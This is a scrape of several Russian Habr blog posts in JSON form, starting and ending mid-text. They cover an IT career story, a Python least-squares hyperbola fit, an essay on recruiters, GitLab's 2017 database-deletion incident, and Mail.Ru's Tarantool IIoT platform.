совершенствовали и дополняли. Точка невозврата После университета мое представление о мире, полном интересных лично мне задач, малость треснуло от удара о реальность. Но мне повезло: друзья предложили переехать в Петербург и заняться выпуском цветной ежедневной спортивной газеты уровня Marcá и Gazzetta dello Sport, а это уникальный проект для России. Такое предложение было большим успехом для вчерашнего выпускника, и я немедленно согласился. Но программист в душе, видимо, требовал выхода. Поэтому вечера проходили за программированием и фрилансом по разработке сайтов. Через некоторое время пришлось решать, чему отдавать больше времени — разработке сайтов или дизайну газеты, так как объем задач по разработке рос в геометрической прогрессии. Очень кстати наступил кризис в отрасли печатных СМИ, который наложился на личную потерю интереса к дизайну и подтолкнул к смене профиля деятельности, что я так долго и старательно откладывал. Главным было «ввязаться в драку» — опубликовать резюме и начать ходить по собеседованиям. После этого начался долгий марафон ежедневных собеседований, каждое из которых добавляло уверенности в своих силах и пополняло копилку каверзных вопросов от собеседующих. Вообще, было неожиданно увидеть такой интерес к резюме без впечатляющего программистского опыта. Видимо, помогли советы моего друга, опытного разработчика, который к тому моменту уже дорос до ИТ-директора. Сидишь вечером, никого не трогаешь, кодишь в PHP… Спустя месяц постоянной самоподготовки и хождений на собеседования меня пригласили в крупное интернет-агентство на проект по разработке системы управления интернет-рекламой и сбора статистики по рекламным кампаниям. На собеседовании речь шла о фронтенд-разработке, но так случилось, что я занимался в основном бэкендом — нагруженной системой, требующей вполне взрослого подхода. Бинго! Но настоящий звездный час настал спустя год работы: передо мной поставили задачу переписать высоконагруженную систему показа баннеров и сбора пользовательской статистики. Прежний вариант был плох тем, что толком не масштабировался из-за не слишком удачных архитектурных решений и был крайне неустойчив. К тому моменту я программировал на Java только факультативно, поэтому задача стала настоящим вызовом и проверкой веры в свои силы. И, как это часто бывает с подобными «динозаврами», в компании не осталось никого, кто хорошо разбирался бы в работе текущей системы. Ну что ж, заодно прокачал навыки бизнес-аналитики и составления ТЗ. Баннерный кризис Спустя полгода мои познания в Java, многопоточном программировании и распределенных системах значительно расширились, а новая баннерная система прошла все круги ада и была сдана в продакшн. Это произошло в 2014 году — как раз в то время, когда в экономике страны начался общий спад и рынок баннерной рекламы с оплатой за показ/переход стал стремительно сокращаться. Как и многие, наша компания решила на всем экономить и свернула дальнейшую перспективную разработку. Но не возвращаться же снова в PHP после такого большого и интересного Java-проекта! А раз идем по нарастающей сложности, то самое время окунуться в «кровавый энтерпрайз», со всеми этими масштабными системами и разработкой «по науке». Как раз в тот момент удача мне еще раз улыбнулась, и мои умения заинтересовали крупного госзаказчика с проектом на Oracle DB, J2EE и всем таким прочим. Если не вдаваться в детали, то проект состоял из огромного монолитного приложения и нескольких микросервисов для работы с ним — в разработке одного из них я и участвовал. Конечно, это был совсем иной уровень, как по масштабу систем, так и по компетенциям коллег. Первый важный вывод Знаете, чего не хватает в энтерпрайзе? Отдачи — реакции на твой продукт от конечного пользователя. Получается, что ты пишешь все эти тысячи строк кода, выпускаешь релиз и… все. Релиз проходит формальное одобрение и уходит в продакшен без каких-либо оценок со стороны пользователя. В корпоративных системах покупатель и пользователь — обычно разные лица. При этом решения принимает покупатель, которого мало интересуют пользователь и его удобства — в таких делах важнее завершить работу в срок и уложиться в бюджет. Это был довольно странный и неожиданный вывод, который «менял все». Так что нет никаких гуманитариев и инженеров — просто мы лучше всего делаем то, что нравится в конкретный момент жизни.Казалось, можно спокойно заниматься энтерпрайз–разработкой, но возникло желание вновь расширить профессиональные горизонты. К тому же сработал «голливудский принцип» — мой профиль на LinkedIn заинтересовал рекрутеров Яндекс.Денег, и позже пришло сообщение из разряда: «Некогда объяснять, приезжай на собеседование!» Тут опустим итерации с несколькими собеседованиями и разной глубины вопросами — суть в том, что я попал в команду бэкенда Яндекс.Денег. И попал именно в тот момент, когда команда занималась миграцией приложений на новую платформу, которая позволила бы ускорить разработку и снизить порог вхождения новых разработчиков в проект. Ощущения от релизов тут, конечно же, совсем иные — можно получить море пользовательских эмоций в комментариях к приложению: то ударит волной о берег за ошибку, то восторг и ура. Есть ощущение отдачи от своих усилий. Еще немного откровений Если вернуться лет на пять назад, то я дал бы себе тогдашнему несколько советов: Не бояться и начинать меняться как можно раньше. Работа в команде быстрее прокачивает навыки, так что фриланс надо оставлять сразу, как начинаешь задумываться о новых направлениях. Продуктовая разработка — это невероятный драйв, и чем ближе к пользователю, тем острее ощущения. Адреналин, как от спорта. На техническом собеседовании нельзя дать «плохих» ответов, зато легко показать неумение рассуждать и думать. Но к собеседованию всё равно надо готовиться: обидно будет провалиться, если забыл какую-то тривиальную вещь. Журналистика — это, конечно, весело и необычно, но все равно мы знаем, чем это закончится. Может, тогда без прелюдий? Пока готовили статью, среди коллег возник спор о важности для карьеры специальности, указанной в дипломе. А вы что думаете?"], "hab": ["Фриланс", "Управление разработкой", "Управление персоналом", "Карьера в IT-индустрии", "Блог компании Яндекс.Деньги"]}{"url": "https://habrahabr.ru/post/322954/", "title": ["Простая программа на Python для гиперболической аппроксимации статистических данных"], "text": ["Зачем это нужно Законы Зипфа оописывают закономерности частотного распределения слов в тексте на любом естественном языке[1]. Эти законы кроме лингвистики применяться также в экономике [2]. Для аппроксимации статистических данных для объектов, которые подчиниться Законам Зипфа используется гиперболическая функция вида: (1) где: a.b – постоянные коэффициенты: x – статистические данные аргумента функции (в виде списка): y- приближение значений функции к реальным данным полученным методом наименьших квадратов[3]. Обычно для аппроксимации гиперболической функцией методом логарифмирования её приводят к линейной, а затем определяют коэффициенты a,b и делают обратное преобразование [4]. Прямое и обратное преобразование приводит к дополнительной погрешности аппроксимации. Поэтому привожу простую программу на Python, для классической реализации метода наименьших квадратов. Алгоритм Исходные данные задаются двумя списками где n ─ количество данных в списках. Получим функцию для определения коэффициентов Коэффициенты a,b найдём из следующей системы уравнений:(3) Решение такой системы не представляет особого труда: (4), (5). Средняя ошибка аппроксимации по формуле: (6) Код Python #!/usr/bin/python # -*- coding: utf-8 -* import matplotlib.pyplot as plt import matplotlib as mpl mpl.rcParams['font.family'] = 'fantasy' def mnkGP(x,y): # функция которую можно использзовать в програме n=len(x) # количество элементов в списках s=sum(y) # сумма значений y s1=sum([1/x[i] for i in range(0,n)]) # сумма 1/x s2=sum([(1/x[i])**2 for i in range(0,n)]) # сумма (1/x)**2 s3=sum([y[i]/x[i] for i in range(0,n)]) # сумма y/x a= round((s*s2-s1*s3)/(n*s2-s1**2),3) # коэфициент а с тремя дробными цифрами b=round((n*s3-s1*s)/(n*s2-s1**2),3)# коэфициент b с тремя дробными цифрами s4=[a+b/x[i] for i in range(0,n)] # список значений гиперболической функции so=round(sum([abs(y[i] -s4[i]) for i in range(0,n)])/(n*sum(y))*100,3) # средняя ошибка аппроксимации plt.title('Аппроксимация гиперболой Y='+str(a)+'+'+str(b)+'/x\\n Средняя ошибка--'+str(so)+'%',size=14) plt.xlabel('Координата X', size=14) plt.ylabel('Координата Y', size=14) plt.plot(x, y, color='r', linestyle=' ', marker='o', label='Data(x,y)') plt.plot(x, s4, color='g', linewidth=2, label='Data(x,f(x)=a+b/x') plt.legend(loc='best') plt.grid(True) plt.show() x=[10, 14, 18, 22, 26, 30, 34, 38, 42, 46, 50, 54, 58, 62, 66, 70, 74, 78, 82, 86] y=[0.1, 0.0714, 0.0556, 0.0455, 0.0385, 0.0333, 0.0294, 0.0263, 0.0238, 0.0217, 0.02, 0.0185, 0.0172, 0.0161, 0.0152, 0.0143, 0.0135, 0.0128, 0.0122, 0.0116] # данные для проверки по функции y=1/x mnkGP(x,y) Результат Мы брали данные из функции равносторонней гиперболы, поэтому и получили a=0,b=10 и абсолютную погрешность в 0,004%. Значить функция mnkGP(x,y) работает правильно и её можно вставлять в прикладную программу Аппроксимация для степенных функций Для этого в Python есть модуль scipy, но он не поддерживает отрицательную степень d полинома. Рассмотрим код реализации аппроксимации данных полиномом. #!/usr/bin/python # coding: utf8 import scipy as sp import matplotlib.pyplot as plt def mnkGP(x,y): d=2 # степень полинома fp, residuals, rank, sv, rcond = sp.polyfit(x, y, d, full=True) # Модель f = sp.poly1d(fp) # аппроксимирующая функция print('Коэффициент -- a %s '%round(fp[0],4)) print('Коэффициент-- b %s '%round(fp[1],4)) print('Коэффициент -- c %s '%round(fp[2],4)) y1=[fp[0]*x[i]**2+fp[1]*x[i]+fp[2] for i in range(0,len(x))] # значения функции a*x**2+b*x+c so=round(sum([abs(y[i]-y1[i]) for i in range(0,len(x))])/(len(x)*sum(y))*100,4) # средняя ошибка print('Average quadratic deviation '+str(so)) fx = sp.linspace(x[0], x[-1] + 1, len(x)) # можно установить вместо len(x) большее число для интерполяции plt.plot(x, y, 'o', label='Original data', markersize=10) plt.plot(fx, f(fx), linewidth=2) plt.grid(True) plt.show() x=[10, 14, 18, 22, 26, 30, 34, 38, 42, 46, 50, 54, 58, 62, 66, 70, 74, 78, 82, 86] y=[0.1, 0.0714, 0.0556, 0.0455, 0.0385, 0.0333, 0.0294, 0.0263, 0.0238, 0.0217, 0.02, 0.0185, 0.0172, 0.0161, 0.0152, 0.0143, 0.0135, 0.0128, 0.0122, 0.0116] # данные для проверки по функции y=1/x mnkGP(x,y) Результат Как следует из графика, при аппроксимации параболой данных изменяющихся по гиперболе средняя ошибка возрастает, а свободный член квадратного уравнения обращается в ноль. Полученные функции будут применены для анализа Законов Зипфа (Ципфа), но это будет сделано уже в следующей статье. Ссылки: 1. Законы Зипфа (Ципфа) tpl-it.wikispaces.com/Законы+Зипфа+%28Ципфа%29 2. Закон Ципфа это. dic.academic.ru/dic.nsf/ruwiki/24105 3. Законы Зипфа. wiki.webimho.ru/законы-зипфа 4. Лекция 5. Аппроксимация функций по методу наименьших квадратов. mvm-math.narod.ru/Lec_PM5.pdf 5. Средняя ошибка аппроксимации. math.semestr.ru/corel/zadacha.php"], "hab": ["Python"]}{"url": "https://habrahabr.ru/post/322602/", "title": ["Почему я игнорирую рекрутёров Google", "перевод"], "text": ["Это реальная история, она — не только про Google. Я нередко получаю письма от рекрутёров Amazon, Facebook, а также небольших стартапов Кремниевой долины. Они как-то находят меня — наиболее вероятно через этот блог, через мои книги или через аккаунт на GitHub. Они всегда начинают с фразы: «Ваш профиль нас сильно впечатлил», — а заканчивают: «Давайте назначим собеседование». Я всегда отвечаю одинаково, а они всегда после этого исчезают, возвращаясь нередко через несколько месяцев под другим именем. Попробую здесь объяснить мои соображения. Возможно, вы будете делать то же, и мы сможем изменить ситуацию. «Охотник на оленей» (1978), режиссёр Майкл Чимино Разъяснение: я понимаю, что имею дело с компаниями стоимостью в миллиарды долларов, лучшими в своей отрасли, и что я — пыль на ветру по сравнению с ними. Я понимаю, что их рекрутёров не заботят мои ответы — они просто нажимают кнопку «Удалить» и двигаются дальше. Я также понимаю, что они никогда не увидят этот пост и что эта статья, скорее всего, ничего не изменит. Однако я должен написать её. Ниже приведено то, что отправляю назад рекрутёрам: Спасибо за ваше обращение! Ваше предложение меня очень заинтересовало. Я не имею ничего против собеседования. Однако есть одно условие: это собеседование должен вести человек, под руководством которого мне предстоит работать. Это значит — мой будущий непосредственный руководитель. Рекрутёры, получившие такой ответ, ни разу не ответили мне. Почему я отправляю такой текст? Очень просто — я получил хороший урок два года назад, когда Amazon предложил мне пройти собеседование для приёма на работу. Я получил от них письмо, где было сказано, что на них произвела сильное впечатление информация в моём профиле, и они не могут дождаться момента начала совместной работы. Им нужен я, только я и никто больше. Я был наивным, и это письмо окрылило меня. Собеседование было назначено в главном офисе в Сиэтле. Они оплатили мне билет на самолёт (из Сан-Франциско) и сутки в пятизвёздочном отеле! Я был потрясён. Они были, действительно, заинтересованы. Я, конечно, тоже. То, что произошло во время интервью, было, скорее всего, очень близко к тому, что Макс Хауэлл испытал в Google: несколько программистов, которые не знали ничего про мой профиль, предлагали мне рисовать разные алгоритмы на доске в течение почти четырёх часов. Справился ли я? Не думаю. Было ли мне сделано предложение? Нет. Чему я научился? Тому, что это была пустая трата времени. Для обеих сторон. Их бюрократическая машина рассчитана на обработку сотен кандидатов в месяц. Чтобы выловить и привлечь таких кандидатов, есть целая армия обезьянок рекрутёров, рассылающих восторженные письма таким, как я. Они должны как-то провести предварительный отбор кандидатов, но они слишком ленивы, чтобы сделать этот процесс эффективным и творческим. Они просто пропускают кандидатов через случайных программистов, которые, как предполагается, задают максимально сложные вопросы. Я не говорю, что люди, которые проходят через эти тесты, не являются хорошими программистами. Я также не говорю, что я сам хороший программист — посмотрим правде в глаза, я не прошёл тест. Полагаю, что эта система фильтрации является довольно хорошей. Я утверждаю лишь то, что такая система противоречит письму, полученному от рекрутёра. Если бы в начале письма было бы сказано: «Мы ищем специалиста по алгоритмам», — то мы просто не двинулись бы дальше и не потратили бы наше время. Ясно, что я — не специалист по алгоритмам. Нет смысла задавать мне вопросы по обходу бинарных деревьев — ответов на них я не знаю, а учить интереса не будет никогда. Я пытаюсь быть хорошим специалистом в чём-то другом, например, в объектно-ориентированном проектировании. Было совершенно очевидное несоответствие между моим профилем и ожиданиями спрашивающих. Я не осуждаю их, и я не осуждаю девушку-рекрутёра. Все они — всего лишь рабы наёмные работники. Я виню самого себя, что не понял всё это прямо с самого начала. Я должен был ответить рекрутёру, что не хотел бы проходить собеседование у каких-то программистов, потому что я, почти наверняка, был бы обречён на провал. Не надо было и пытаться. Я хотел бы разговаривать с человеком, которому я, действительно, нужен: с моим будущим руководителем. Этот человек ознакомился бы с информацией моего профиля. От него не было бы бессмысленных вопросов про алгоритмы по той простой причине, что он знал бы мои будущие обязанности и проблемы, которые я был бы способен решать, если бы компания приняла меня на работу. К сожалению, как я продолжаю наблюдать в течение двух лет моего отфутболивания писем обратно рекрутёрам, они не могут ничего изменить. Они обязаны обеспечить формальный и стандартный отбор для любого, начиная с одинаковых тёплых и лестных первоначальных обещаний. Мне очень жаль, господа рекрутёры, но стандартные собеседования я больше проходить не буду."], "hab": ["Управление персоналом", "Карьера в IT-индустрии"]}{"url": "https://habrahabr.ru/post/320988/", "title": ["Gitlab «лежит», база уничтожена (восстанавливается)"], "text": ["Вчера, 31 января, сервис Gitlab случайно уничтожил свою продакшн базу данных (сами гит-репозитории не пострадали). Дело было примерно так. По какой-то причине стала отставать hot-standby реплика базы (PostgreSQL) (реплика была единственная). Сотрудник gitlab какое-то время пытался повлиять на ситуацию различными настройками и т.д, потом решил всё стереть и налить реплику заново. Пытался стереть папку с данными на реплике, но перепутал сервера и стёр на мастере (сделал rm -rf на db1.cluster.gitlab.com вместо db2.cluster.gitlab.com). Интересно, что в системе было 5 разных видов бекапов/реплик, и ничего из этого не сработало. Был лишь LVM snapshot, сделанный случайно за 6 часов до падения. Вот, привожу сокращенную цитату из их документа. Обнаруженные проблемы: 1) LVM snapshots are by default only taken once every 24 hours. 2) Regular backups seem to also only be taken once per 24 hours, though YP has not yet been able to figure out where they are stored. 3) Disk snapshots in Azure are enabled for the NFS server, but not for the DB servers. 4) The synchronisation process removes webhooks once it has synchronised data to staging. Unless we can pull these from a regular backup from the past 24 hours they will be lost 5) The replication procedure is super fragile, prone to error, relies on a handful of random shell scripts, and is badly documented 6) Our backups to S3 apparently don’t work either: the bucket is empty 7) We don’t have solid alerting/paging for when backups fails, we are seeing this in the dev host too now. Таким образом, делают вывод gitlab, из 5 бекапов/техник репликации ничего не сработало надежно и как надо => поэтому идет восстановление из случайно сделанного 6-часового бекапа → Вот полный текст документа"], "hab": ["Системное администрирование", "Администрирование баз данных", "DevOps"]}{"url": "https://habrahabr.ru/company/mailru/blog/322730/", "title": ["Что такое платформа Tarantool IIoT?"], "text": ["Недавно в пресс-релизе мы рассказали о том, что запустили Tarantool IIoT — платформу для промышленного интернета вещей. Новость облетела многие электронные издания. Но что такое Tarantool IIoT и как он работает — тема оставалась не до конца раскрытой. Мы решили это исправить. Подробности под катом. А что вообще такое IIoT? Сначала я напомню, что IIoT — это industrial internet of things (промышленный интернет вещей). Это такая концепция, когда у объектов промышленности появляется доступ в интернет как в сеть и доступ к интернет-сервисам (которые работают в центрах обработки данных — ЦОДах). Давайте посмотрим на рисунок: Что мы тут видим? Рисунок поделен на две части — «центр» и «на местах». «Центр» — это ЦОД или облако, т. е. любой облачный IaaS-сервис, в котором можно разворачивать IT-инфраструктуру: Amazon, Azure и т. д. «На местах» — я, если честно, не знаю, какой правильный термин тут использовать. Уверен, читатели меня поправят и предложат красивое определение. Я лучше расскажу, что имею в виду под «на местах»: в поле (в прямом смысле слова — на агрокультурном поле), на производственной площадке (на заводе, фабрике, металлообрабатывающих, горнодобывающих и нефтегазовых объектах), на ремонтной площадке, на транспорте (в автомобиле, грузовике, ж/д вагоне, локомотиве), на объектах городской инфраструктуры (в местах сбора информации о потреблении электричества и воды, в канализации, вдоль улиц, в объектах освещения), на объектах междугородной инфраструктуры (вдоль шоссе, железных дорог, возможно, линий электропередач). В общем, «на местах» — это везде, куда рука интернета только начинает добираться. Еще можно сказать «в поле», но тогда появляется риск сузить круг промышленного интернета вещей только до агрокультурного поля. А что такое Tarantool IIoT? Какие проблемы он призван решать? Tarantool IIoT — это распределенная софтверная платформа для сбора информации с датчиков и отправки ее в центр и на локальные системы управления. Tarantool IIoT работает и «в центре», и «на местах», соединяя их в единую информационную сеть. В этой сети максимум логики унесено в софт, поэтому с точки зрения железа она может быть собрана из commodity-компонентов, т. е. не нуждается в специальных поставщиках закрытых проприетарных программно-аппаратных платформ. Стало понятнее? Если нет, то читайте дальше :-) Под commodity-компонентами имеются в виду легко заменяемые дешевые компоненты. Например, если мы вспомним дата-центры, то с точки зрения их железа commodity — это недорогие серверы, например supermicro или даже полностью самосборные серверы. С точки зрения железа «на местах» это могут быть самые дешевые датчики и IoT-хабы (т. е. маленькие компьютеры на основе ARM). Внутри своих дата-центров в Mail.Ru Group мы уже достаточно давно почти полностью перешли на commodity-железо. Иногда без фирменной брендовой гарантии и саппорта, зато недорогое и взаимозаменяемое. При этом надежность и производительность обеспечиваются на уровне софта. Если что-то ломается, то это не критично для сервисов, потому что все задублировано и зареплицировано на уровне софта — мы просто спокойно отправляем железо в ремонт. Сроки и вообще возможность починки железа не влияют на непрерывность бизнеса. По такому же пути давно прошли крупные американские IT-корпорации: вся сложность переносится на софт, при этом железо максимально стандартизируется и удешевляется. И теперь мы предлагаем распространить этот подход и на мир IoT. Спрашивается, зачем места и центр соединять в единую информационную сеть? Ответ такой: На местах есть источники информации (о температуре, вибрации, геопозиции, влажности, напряжении, давлении и т. д.). Эту информацию хорошо бы собирать, агрегировать и передавать в центр для аналитики, чтобы потом делать выводы о количестве и точках потерь при производстве продукции, потреблении сырья и топлива, эффективности работы на местах, периодах обслуживания, вероятности поломки станков и приборов и пр. На местах есть инфраструктура, которой иногда удобно управлять из центра, в том числе на основе ранее полученной аналитики. Управлять означает посылать из центра на места команды (вызывать API), которые будут активировать (выключать, включать, уменьшать, увеличивать, замедлять, ускорять) локальные объекты. На мой взгляд, пока рано говорить о полном и повсеместном управлении производством из центра (никто не хочет, чтобы из-за зависшего сетевого соединения упал 15-тонный пресс), но многие некритичные вещи можно делать. Например, если на основе анализа данных от датчиков вибрации оборудования стало ясно, что оборудование скоро выйдет из строя, то можно отправить из центра на завод команду, которая зажжет красную мигающую лампочку (да-да, именно так: если пушнуть это событие на планшет местному работнику, то он его попросту не заметит, ведь будет занят). Увидев мигание лампочки, сотрудники остановят сломанный станок и закажут досрочное проведение технического обслуживания. На местах, как вы понимаете, есть своя специфика, отличная от ЦОДа. Оговорюсь сразу, что мы в Mail.Ru Group только в начале пути развития своей IIoT-стратегии и не так давно прощупываем рынок IIoT, поэтому, возможно, пока не до конца понимаем все тонкости. Вот что мы сейчас думаем о специфике. Это: огромные площади (возьмите средней руки завод — по площади он может в сотни раз превосходить даже большой дата-центр); суровые условия (жар, холод, влажность); повышенный риск повреждения объектов IT-инфраструктуры; высокая стоимость замены объектов IT-инфраструктуры (добраться в поле за тысячу верст по бездорожью и объехать там сотню квадратных километров — это вам не в ЦОД в Москве смотаться); внешняя по отношению к IT-инфраструктуре информация, которую нужно собирать с помощью датчиков температуры, влажности, плотности, геопозиции, веса, напряжения и т. д. Что вся эта специфика означает? Что мы не можем строить на заводах, полях, кораблях, городских улицах и прочих объектах то, что мы строим в ЦОДах: ряды одинаковых стоек с серверами внутри, скоммутированные через оптоволокно. Это будет безумно дорого. А что мы еще не можем? В мире IoT роль серверов играют IoT Hubs — микрокомпьютеры (промышленные аналоги Raspberry PI), которые разбросаны на многих километрах площадок. Между ними оптоволокно тянуть — дорого. И в стойки собирать их тоже дорого, потому что из-за огромных расстояний IoT Hubs слишком много, и предприятия, ограниченные финансово, не могут формировать локальные кластеры из большого количества IoT Hubs. То есть нет локализованных стоек. Есть разбросанное по местности железо. Далее, у предприятий/объектов есть миллионы разбросанных повсюду датчиков (см. выше, о каких датчиках речь), с которых IoT Hubs собирают информацию. Опять же — как ее собирать? Если датчиков мало, то по проводам. А если их миллион, то через радиоканалы (миллион проводов, по проводу от датчика — представляете, какой клубок?). В итоге, чтобы решение было более-менее cost-effective, вся эта конструкция может выглядеть вот так: Датчики собирают информацию и отправляют ее на хабы (это не сетевые хабы, просто называются так же: это микрокомпьютеры с маленькой материнкой, процем, памятью и операционкой), хабы передают информацию в интернет (через мобильную связь, Wi-Fi, спутниковую связь, Ethernet и т.п.), и она долетает до ЦОДа. Ровно так же путешествует обратный поток — из ЦОДа на хабы, с хабов на датчики (или на локальные программируемые логические контроллеры). Идем далее. Еще помните о специфике мира IIoT? Чтобы вся эта конструкция не стоила космических денег, хочется, чтобы: IoT Hubs состояли из потенциально заменяемого железа, это снизит вероятность vendor lock-in и цену железа, которого нужно ой как много из-за огромных расстояний; поверх была открытая операционка (например, разновидность Linux — OpenWrt); вся логика взаимодействия с любыми видами датчиков и разбором их протоколов ушла на уровень софта поверх операционки (чтобы не зависеть от дорогих черных брендовых ящиков); вся логика отправки сигналов в сторону датчиков и оборудования также ушла на уровень локального софта на IoT Hub, а не была захардкожена в вендорских железных коробках (имеется в виду логика обработки, а не физическая передача данных); софт, работающий на IoT Hubs, был очень быстрый. IoT Hubs медленные, а медленные, потому что дешевые, а дешевые, потому что их надо очень много, а очень много надо из-за специфики (см. выше). А еще вспомните про специфику в виде жары-холода-влажности-вибрации, т. е. этим хабам нужны специальные корпуса. А цену-то наращивать нельзя. Значит, надо делать техническую начинку еще дешевле, стало быть, еще медленнее. Представляете, как быстро должен шуршать софт, чтобы дебет с кредитом сходился? То есть хорошо бы, иными словами, иметь то, что мы привыкли видеть в ЦОДах: заменяемое недорогое железо, вся логика на уровне софта и весь fault-tolerance на уровне софта. А теперь давайте обратим взгляд на софт в ЦОДе. Там, кроме операционки, почти всегда используется много других компонентов — СУБД, серверы приложений, системы мониторинга, DevOps-скрипты и системы. И уже поверх этой инфраструктуры пишется бизнес-логика. По-хорошему, вся описанная инфраструктура конфигурируется так, чтобы автоматически (ну или полуавтоматически) брать на себя основные проблемы сбоев на стороне железа (переключать нагрузку на реплику базы данных, если мастер-копия недоступна, распределять нагрузку между несколькими нодами серверов приложений, автоматом наливать чистую машину, которая подключена в кластер, и т. д.). То есть появилось несколько специализаций. Разработчики бизнес-логики (продуктовые разработчики), по-хорошему, думают в основном о бизнес-логике и фокусируются на бизнес-проблемах. А еще имеются инженеры и разработчики остальной, огромной подводной части айсберга — DevOps, системные администраторы, разработчики СУБД, разработчики серверов приложений, систем мониторинга и других (назовем их инфраструктурными) компонентов. Вот бы и на местах так было. Круто же? Вот бы разработка на IoT Hubs была такой же специализированной. Tarantool IIoT — под капотом И тут мы плавно подходим к Tarantool IIoT. Я не скажу, что он призван заменить всю вышеуказанную инфраструктуру на IoT Hubs, но он может сделать это частично. Посмотрите на рисунок: Tarantool IIoT — это обычный Tarantool, но собранный и оттестированный под ARM и под x86 (версия для MIPS сейчас создается). Кроме того, внутрь него встроена автоматическая поддержка протоколов MQTT и MRAA — это основные протоколы для работы с датчиками. Tarantool IIoT инсталлируется непосредственно на IoT Hubs. Еще можно тут добавить, что для передачи данных между датчиками и хабом (на схеме «на местах») нужно специальное оборудование LORA1 или 6LoWPAN. Что, казалось бы, плохо (помните, мы не хотим уникальных вендорских коробок). Но вся соль в том, что это оборудование не обязано понимать протоколы множества датчиков. Его задача — только завернуть протокол в понятный для хаба протокол (обычно это наш любимый старый добрый TCP/IP). Весь остальной разбор можно делать на Tarantool IIoT с помощью скриптов, которые работают прямо на IoT Hub. В этом преимущества программной платформы над железной — любое оборудование и любые протоколы можно поддержать самостоятельно, без вендора. Технические детали, как это все устроено и как программируется с помощью Tarantool, можно почитать в статье «Master-master репликация и масштабирование приложений между всеми IoT-устройствами и облаком». Во всем остальном Tarantool IIoT — это полнофункциональный Tarantool, т. е. СУБД со встроенным сервером приложений, синхронным логом транзакций, репликацией между узлами, двумя движками (in-memory — memtx и on-disk — vinyl), хранимыми процедурами, асинхронными джобами, поддержкой очередей и прочими пирогами. Что Tarantool IIoT дает разработчику? Tarantool IIoT инсталлируется на IoT Hubs. Что это дает? На Tarantool IIoT можно писать скрипты, которые принимают информацию с датчиков, парсят ее и сохраняют в локальную базу данных прямо внутри Tarantool IIoT (она персистится на флеш-памяти IoT хаба). Информация, сохраненная на IoT Hub, локально реплицируется между несколькими IoT Hub для надежности (чтобы вся система продолжала работать даже после выхода одного или нескольких хабов из строя). Репликация у Tarantool есть сразу из коробки, т. е. не надо писать свою систему очередей. Вот тут, кстати, важный момент: Tarantool — это не только сервер приложений, но и СУБД. А значит, в нем можно персистить данные и реплицировать данные между узлами. Очень важные свойства в свете сказанного выше. И очень важно, что оно работает из коробки и протестировано годами (ибо ядро Tarantool ровно такое же, как и для обычных не IoT сервисов). Информация, сохраненная на IoT-хабах, реплицируется в ЦОД встроенными средствами Tarantool. Причем только та ее часть или агрегация, которую вы хотите реплицировать (настройка программируется и работает прямо на IoT Hub). Можно автоматом загружать код и хранимые процедуры в Тарантулы на местах, т. е. менять логику локальной агрегации из ЦОДа (т. е. отовсюду, откуда есть доступ в ЦОД: из офиса или из дома через VPN) без выезда на места. Можно по одной кнопке из ЦОДа (а значит, и из веб-интерфейса, доступ к которому есть у авторизованных людей с любого устройства из любой точки мира) менять степень детализации доставки информации в центр, при этом локально, на местах, получать столько информации, сколько надо, и обрабатывать ее без передачи в ЦОД. Как итог — продуктовый разработчик получает шажок в сторону той степени комфорта, которая присутствует при создании софта, работающего в ЦОДе. Не приходится думать о том, что каналы между хабами локально и между хабом и ЦОДом ненадежны и рвутся: репликация все равно доставит данные в обе стороны без потерь и без задвоения. У разработчика меньше болит голова о клиент-серверной архитектуре, о файликах, о потере данных, о выходе из строя хабов — все это хендлит Tarantool IIoT ровно так же, как это происходит в ЦОДе при использовании обычного Tarantool. Разработчик может больше сконцентрироваться на бизнес-логике. Еще добавлю тут, что доставкой данных занимается штатный механизм репликации между узлами, который тестируется в Tarantool на протяжении уже девяти лет. То есть надежность механизма достаточно высока. По сути, Tarantool IIoT — это полностью программируемая открытая платформа, которая позволяет не только разрабатывать приложения под IIoT на локальных устройствах (без выезда на места!), но и переносить best practices из ЦОДа на IoT-устройства на местах. И еще эта платформа развязывает вам руки в том смысле, в котором производители оборудования вам их ранее связали. Например, у вас уже есть готовая и работающая железная IoT-инфраструктура, которая автоматом доставляет все из датчиков в ЦОД. Вы закупили новую партию более дешевых датчиков, которые не поддерживаются вашим текущим оборудованием. Вам придется валяться в ногах у вендора оборудования, чтобы он за большие деньги внес туда изменения. Ну или просто закупить новую версию оборудования. Или отказаться от дешевых датчиков. И все эти изменения — железные, не софтверные, т. е. с downtime, выездом на места, монтажом и прочими неприятностями. С помощью Tarantool IIoT же можно без проблем получать данные с этих новых дешевых датчиков, парсить их и далее выдавать в ваше оборудование или в локальный софт в нужном формате. Без downtime и без больших затрат. Понятно, что самого по себе Tarantool IIoT мало. Для полного комфорта нужны и остальные инфраструктурные системы — мониторинг, удаленный апгрейд софта (тот же Tarantool надо апгрейдить), автоматическая наливка Linux и прочие радости. Но, как нам кажется, это уже шаг в нужном направлении. Почему вообще Tarantool IIoT, а не $любая_другая_технология IIoT? В заключение я хочу рассказать, почему в качестве основы для нашего IIoT-продукта мы взяли именно Tarantool. Давайте на секунду вернемся к специфике IoT Hubs: у этих устройств медленные процессоры с малым количеством ядер (обычно одно-два ядра), мало оперативной памяти, мало флеш-памяти, которая к тому же медленная и ненадежная. Почему? Устройства должны быть очень дешевыми (ценовой диапазон приблизительно такой: 30—100 долларов), потому что их очень много, потому что инфраструктура разбросана на многие километры — и еще по ряду причин, см. выше. Помните, я говорил о специфике? От нее не уйти. Это с одной стороны. А с другой стороны, датчики генерируют огромное количество информации (с одного датчика могут поступать десятки и сотни параметров в секунду, а количество датчиков на хаб иногда исчисляется сотнями и тысячами). Всю информацию надо успевать обрабатывать, несмотря на жесткие условия и не очень быстрое оборудование. Соответственно, для таких устройств нужны о-о-очень быстрый софт, очень быстрая СУБД и очень быстрый сервер приложений, способный работать на одном ядре процессора, максимально эффективно использующий память и не напрягающий диск. И в условиях всех этих ограничений Tarantool на наших тестах показал лучшие результаты. Ближайшим конкурентом по скорости может быть Redis (с CouchBase и Aerospike, к сожалению, у нас ничего не получилось: они очень медленные на одноядерных машинах, но, возможно, мы просто не умеем их готовить). Главные минусы Redis с точки зрения применимости в IoT: в нем недостаточно развит сервер приложений, нет хранимых процедур (и нельзя в рантайме обновлять код внутри СУБД), нет джобов, нет мастер-мастер репликации, нет транзакций — больше вероятность потери данных. Плюс непонятно, планируют ли авторы продукта вообще развиваться в эту сторону. Вот тут пример сравнения двух продуктов: Tarantool vs Redis. Связка Python и Redis может в каком-то смысле заменить Tarantool, но по скорости, скорее всего, сильно проиграет. Сразу оговорюсь — сравнительных тестов пока нет, плюс мы рекомендуем скорость работы сравнивать в каждом случае, case by case. Еще один важный нюанс: на IoT-девайсах, когда 